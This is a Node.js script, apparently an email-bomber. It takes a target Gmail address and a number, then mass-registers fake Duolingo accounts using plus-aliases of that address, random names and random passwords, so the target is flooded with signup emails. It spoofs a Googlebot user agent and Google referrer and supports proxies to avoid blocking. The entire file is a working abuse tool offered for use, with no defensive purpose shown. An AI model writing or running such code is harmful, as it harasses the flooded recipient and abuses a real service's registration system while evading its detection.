const reader = require("readline-sync");
const fetch = require("node-fetch");
const HttpsProxyAgent = require("https-proxy-agent");

const randomNumber = require("./utils/randomNumber");
const randomId = require("./utils/randomId");
const config = require("./config");

async function sendRequests(email, amount) {

    var amountOfSentMails = amount;

    for (var i = 0; i < amount; i++) {
        setTimeout(async () => {
            try {
                const data = await fetch("https://www.duolingo.com/2017-06-30/users?fields=id", {
                    agent: config.proxy.enabled ? new HttpsProxyAgent(config.proxy.proxy) : null,
                    timeout: config.requestTimeout * 1000,
                    method: "POST",
                    headers: {
                      "accept": "application/json, text/plain, */*",
                      "accept-language": "en-US,en;q=0.9",
                      "content-type": "application/json;charset=UTF-8",
                      "Referer": "https://www.google.com/",
                      "Referrer-Policy": "strict-origin-when-cross-origin",
                      "user-agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"
                    },
                    body: JSON.stringify({
                      //distinctId: "lol",
                      signal: null,
                      timezone: "America/Montreal",
                      fromLanguage: "en",
                      age: randomNumber(18,80).toString(),
                      email: email.split("@gmail.com")[0] + `+${randomId(16)}` + '@gmail.com',
                      identifier: "",
                      name: randomId(8),
                      password: randomId(12),
                      username: null,
                      landingUrl: "https://www.duolingo.com/welcome",
                      initialReferrer: "https://www.google.com/",
                      lastReferrer: "https://www.google.com/",
                    }),
                  }).then(res => res.json())
    
                  if (!data.id) {
                    amountOfSentMails = amountOfSentMails - 1;
                    return console.log(`Failed to send request.`)
                  }
    
                  return console.log(`Successfully sent request!`)   
                  
            } catch (e) {
                amountOfSentMails = amountOfSentMails - 1;
                return console.log(`Failed to send request.`)
            }
        }, config.delayBetweenRequests * i)
    }
}

async function questions() {
    let email = reader.question("Email: ");

    if (!email.includes("@gmail.com") && !email.includes("@googlemail.com")) return console.log("Not gmail address");

    let amount = reader.question("Amount of emails to send: ");

    if (isNaN(amount)) return console.log("Amount is not a number!")

    console.log(`Sending ${amount} requests to ${email}, please wait...`)

    return sendRequests(email, amount)
}

questions();

